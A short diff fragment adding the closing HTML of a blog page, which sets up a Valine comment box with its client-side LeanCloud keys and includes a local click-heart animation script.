+  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+    new Valine({
+        av: AV,
+        el: '#vcomments' ,
+        verify: false,
+        notify: false,
+        appId: 'MpjYiGHS1d0QlJPiqPcvHDY1-gzGzoHsz',
+        appKey: 'anlgXscWqVHMh6r0MiUOvmBN',
+        placeholder: '请在此输入您的留言'
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+	<!-- 页面点击小红心 -->
+	<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
